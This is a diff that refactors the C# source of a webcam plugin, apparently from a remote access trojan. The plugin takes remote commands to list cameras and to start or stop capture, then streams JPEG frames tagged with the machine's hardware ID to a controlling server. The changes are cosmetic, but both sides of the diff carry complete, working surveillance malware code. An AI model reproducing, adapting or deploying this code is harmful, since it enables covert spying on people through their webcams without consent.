@@ -1,19 +1,20 @@
-﻿using AForge.Video;
-using AForge.Video.DirectShow;
-using MessagePackLib.MessagePack;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Text;
 using System.Threading;
+using AForge.Video;
+using AForge.Video.DirectShow;
+using MessagePackLib.MessagePack;
+using Encoder = System.Drawing.Imaging.Encoder;
 
 namespace Plugin
 {
     public static class Packet
     {
-        public static bool IsOk = false;
+        public static bool IsOk;
         public static VideoCaptureDevice FinalVideo;
         private static MemoryStream Camstream = new MemoryStream();
         private static int Quality = 50;
@@ -22,48 +23,52 @@ namespace Plugin
         {
             try
             {
-                MsgPack unpack_msgpack = new MsgPack();
+                var unpack_msgpack = new MsgPack();
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                 {
                     case "webcam":
+                    {
+                        switch (unpack_msgpack.ForcePathObject("Command").AsString)
                         {
-                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
+                            case "getWebcams":
                             {
-                                case "getWebcams":
-                                    {
-                                        GetWebcams();
-                                        break;
-                                    }
-
-                                case "capture":
-                                    {
-                                        if (IsOk == true) return;
-                                            IsOk = true;
-                                            FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
-                                            FinalVideo = new VideoCaptureDevice(videoCaptureDevices[0].MonikerString);
-                                            Quality = (int)unpack_msgpack.ForcePathObject("Quality").AsInteger;
-                                            FinalVideo.NewFrame += CaptureRun;
-                                            FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[unpack_msgpack.ForcePathObject("List").AsInteger];
-                                            FinalVideo.Start();
-                                        break;
-                                    }
-
-                                case "stop":
-                                    {
-                                        new Thread(() =>
-                                        {
-                                            try
-                                            {
-                                                CaptureDispose();
-                                            }
-                                            catch { }
-                                        }).Start();
-                                        break;
-                                    }
+                                GetWebcams();
+                                break;
                             }
-                            break;
+
+                            case "capture":
+                            {
+                                if (IsOk) return;
+                                IsOk = true;
+                                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                                FinalVideo = new VideoCaptureDevice(videoCaptureDevices[0].MonikerString);
+                                Quality = (int)unpack_msgpack.ForcePathObject("Quality").AsInteger;
+                                FinalVideo.NewFrame += CaptureRun;
+                                FinalVideo.VideoResolution =
+                                    FinalVideo.VideoCapabilities[unpack_msgpack.ForcePathObject("List").AsInteger];
+                                FinalVideo.Start();
+                                break;
+                            }
+
+                            case "stop":
+                            {
+                                new Thread(() =>
+                                {
+                                    try
+                                    {
+                                        CaptureDispose();
+                                    }
+                                    catch
+                                    {
+                                    }
+                                }).Start();
+                                break;
+                            }
                         }
+
+                        break;
+                    }
                 }
             }
             catch (Exception ex)
@@ -78,22 +83,22 @@ namespace Plugin
             {
                 if (Connection.IsConnected)
                 {
-                    if (IsOk == true)
+                    if (IsOk)
                     {
-                        Bitmap image = (Bitmap)e.Frame.Clone();
+                        var image = (Bitmap)e.Frame.Clone();
                         using (Camstream = new MemoryStream())
                         {
-                            System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
-                            EncoderParameters myEncoderParameters = new EncoderParameters(1);
-                            EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, Quality);
+                            var myEncoder = Encoder.Quality;
+                            var myEncoderParameters = new EncoderParameters(1);
+                            var myEncoderParameter = new EncoderParameter(myEncoder, Quality);
                             myEncoderParameters.Param[0] = myEncoderParameter;
-                            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
+                            var jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                             image.Save(Camstream, jpgEncoder, myEncoderParameters);
                             myEncoderParameters?.Dispose();
                             myEncoderParameter?.Dispose();
                             image?.Dispose();
 
-                            MsgPack msgpack = new MsgPack();
+                            var msgpack = new MsgPack();
                             msgpack.ForcePathObject("Pac_ket").AsString = "webcam";
                             msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                             msgpack.ForcePathObject("Command").AsString = "capture";
@@ -112,7 +117,9 @@ namespace Plugin
                             CaptureDispose();
                             Connection.Disconnected();
                         }
-                        catch { }
+                        catch
+                        {
+                        }
                     }).Start();
                 }
             }
@@ -125,7 +132,9 @@ namespace Plugin
                         CaptureDispose();
                         Connection.Disconnected();
                     }
-                    catch { }
+                    catch
+                    {
+                    }
                 }).Start();
                 Debug.WriteLine("CaptureRun: " + ex.Message);
             }
@@ -133,14 +142,10 @@ namespace Plugin
 
         private static ImageCodecInfo GetEncoder(ImageFormat format)
         {
-            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-            foreach (ImageCodecInfo codec in codecs)
-            {
+            var codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (var codec in codecs)
                 if (codec.FormatID == format.Guid)
-                {
                     return codec;
-                }
-            }
             return null;
         }
 
@@ -148,15 +153,16 @@ namespace Plugin
         {
             try
             {
-                StringBuilder deviceInfo = new StringBuilder();
-                FilterInfoCollection videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                var deviceInfo = new StringBuilder();
+                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                 foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                 {
                     deviceInfo.Append(videoCaptureDevice.Name + "-=>");
-                    VideoCaptureDevice device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
+                    var device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                     Debug.WriteLine(videoCaptureDevice.Name);
                 }
-                MsgPack msgpack = new MsgPack();
+
+                var msgpack = new MsgPack();
                 if (deviceInfo.Length > 0)
                 {
                     msgpack.ForcePathObject("Pac_ket").AsString = "webcam";
@@ -171,9 +177,12 @@ namespace Plugin
                     msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                     msgpack.ForcePathObject("List").AsString = "None-=>";
                 }
+
                 Connection.Send(msgpack.Encode2Bytes());
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private static void CaptureDispose()
@@ -185,7 +194,9 @@ namespace Plugin
                 FinalVideo.NewFrame -= CaptureRun;
                 Camstream?.Dispose();
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
